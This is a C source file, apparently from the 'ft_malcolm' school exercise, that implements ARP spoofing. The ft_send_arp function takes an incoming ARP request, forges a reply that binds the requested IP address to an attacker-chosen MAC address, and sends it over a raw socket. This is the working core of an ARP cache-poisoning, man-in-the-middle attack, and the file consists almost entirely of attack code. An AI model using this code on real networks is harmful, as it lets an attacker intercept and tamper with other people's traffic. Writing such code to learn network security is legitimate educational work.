#include "../include/ft_malcolm.h"
#include "../Libft/src/libft.h"

static void	ft_set_hdr(struct ether_header *eth, struct ether_arp *arp,
		u_char *src_mac, u_char *target_mac, char *ip_spoof, char *ip_target)
{

	ft_memset(eth->ether_dhost, 0xff, MAC_ADDR_LEN);
	ft_memcpy(eth->ether_shost, src_mac, MAC_ADDR_LEN);
	eth->ether_type = htons(ETH_P_ARP);

	arp->arp_hrd = htons(ARPHRD_ETHER);
	arp->arp_pro = htons(ETH_P_IP);
	arp->arp_hln = ETH_ALEN;
	arp->arp_pln = 4;
	arp->arp_op = htons(ARPOP_REPLY);

	ft_memcpy(arp->arp_sha, src_mac, MAC_ADDR_LEN);
	if (inet_pton(AF_INET, ip_spoof, arp->arp_spa) != 1)
	{
		perror("inet_pton error");
		exit(1);
	}
	ft_memcpy(arp->arp_tha, target_mac, MAC_ADDR_LEN);
	if (inet_pton(AF_INET, ip_target, arp->arp_tpa) != 1)
	{
		perror("inet_pton error");
		exit(1);
	}
}


void	ft_send_arp(t_info info, int sock, struct ether_arp *recv_arp, struct ether_header *recv_eth)
{
	char				buffer[42] = {0};
	u_char				source_mac[MAC_ADDR_LEN] = {0};
	struct ether_header	*eth;
	struct ether_arp	*arp;
	struct sockaddr_ll	device;
	char				ip_spoof[16] = {0};
	char				ip_target[16] = {0};

	eth = (struct ether_header *)buffer;
	arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));
	ft_set_device(&info, &device);
	if (sscanf(info.mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
				&source_mac[0], &source_mac[1], &source_mac[2],
				&source_mac[3], &source_mac[4], &source_mac[5]) != MAC_ADDR_LEN)
	{
		perror("MAC address format error");
		exit(1);
	}
	if (inet_ntop(AF_INET, recv_arp->arp_tpa, ip_spoof, sizeof(ip_spoof)) == NULL)
	{
		perror("inet_ntop error");
		exit(1);
	}
	if (inet_ntop(AF_INET, recv_arp->arp_spa, ip_target, sizeof(ip_target)) == NULL)
	{
		perror("inet_ntop error");
		exit(1);
	}
	ft_set_hdr(eth, arp, source_mac, recv_eth->ether_shost, ip_spoof,ip_target);
	if (sendto(sock, buffer, sizeof(buffer), 0,
				(struct sockaddr *)&device, sizeof(device)) < 0)
	{
		perror("sendto error");
		exit(1);
	}
	printf("Sent ARP reply: %s at %s\n", ip_spoof, info.mac_src);
}
